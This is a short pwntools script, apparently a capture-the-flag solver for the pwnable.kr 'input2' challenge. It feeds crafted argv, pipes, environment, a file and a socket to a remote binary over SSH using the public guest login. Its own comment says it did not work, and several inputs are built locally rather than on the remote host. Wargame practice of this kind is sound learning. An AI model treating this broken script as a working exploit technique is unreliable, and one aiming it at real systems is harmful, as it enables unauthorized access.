# Tried to develop a remote exploit but it didnt work 

import struct
from pwn import *
import os 
import sys 
import socket 

PORT = 1234
HOST = "127.0.0.1"  
argc = 100
v = ["A"] * argc
v[ord('A')] = '\x00'
v[ord('B')] = '\x20\x0a\x0d'
v[ord('C')] = f'{PORT}'

r_in, w_in = os.pipe() 
r_err, w_err = os.pipe()

os.write(w_in,b'\x00\x0a\x00\xff')
os.write(w_err,b'\x00\x0a\x02\xff')

env = {}
env['\xde\xad\xbe\xef'] = '\xca\xfe\xba\xbe'

with open('\x0a' , "w") as f:
    f.write('\x00\x00\x00\x00')


session = ssh("input2","pwnable.kr",2222,"guest")
exploit_process = session.process(executable='./input' , argv=v,stdin=r_in, stderr=r_err,env=env)



with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(b"\xde\xad\xbe\xef")

exploit_process.interactive()
exploit_process.close()
session.close()
